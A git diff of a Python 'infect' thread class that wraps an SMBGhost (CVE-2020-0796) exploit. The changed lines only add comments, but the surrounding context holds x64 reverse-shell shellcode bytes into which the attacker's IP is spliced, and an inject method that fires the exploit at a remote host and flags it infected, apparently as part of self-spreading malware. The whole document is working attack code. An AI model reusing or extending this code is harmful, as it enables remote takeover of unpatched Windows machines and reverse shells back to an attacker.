@@ -5,6 +5,7 @@ import armory.SMBGhost.exploit as exploit
 
 class infect(threading.Thread):
     
+    # initialize the infect object
     def __init__(self, rhost, rport, lhost, lport, infected=False):
         self.rhost=rhost
         self.rport=rport
@@ -13,11 +14,13 @@ class infect(threading.Thread):
         self.infected = infected
         
         super().__init__()
-        
+    
+    # start infect thread
     def run(self):
         self.inject()
        
-        
+    
+    # generate the shellcode base on current host's ip address
     def insert_ip_shellcode(self,lhost):
         PAYLOAD =  b""
         PAYLOAD += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
@@ -42,6 +45,7 @@ class infect(threading.Thread):
         PAYLOAD += b"\x49\xbc\x02\x00\x05\x39"
 
         #\xc0\xa8\x38\x6c
+        # append local ip bytes into the shellcode
         ip_parts = [int(part) for part in lhost.split(".")]
         hex_string = "".join([format(part, "02x") for part in ip_parts])
         ip_bytes = bytes.fromhex(hex_string)
@@ -68,7 +72,8 @@ class infect(threading.Thread):
         PAYLOAD += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
         PAYLOAD += b"\x89\xda\xff\xd5"
         return PAYLOAD
-        
+
+    # generate windows shellcode    
     def generate_windows_shellcode(self,lhost, lport=445, arch="x64"):
         print("Generating Shellcode %s with lhost %s and lport %s" % (arch, lhost, lport))
         
@@ -94,8 +99,12 @@ class infect(threading.Thread):
     def get_status(self):
         return self.status
     
+    # exploits the target using CVE20200796 vulnerability SMBGhost
     def inject(self):
+        #build the reverse shellcode payload
         shell = self.generate_windows_shellcode(self.lhost,self.lport)
+        
+        #exploit the target
         result = exploit.exploit_SMBGhost(self.rhost, self.rport, shell)
         if result:
             self.infected = True
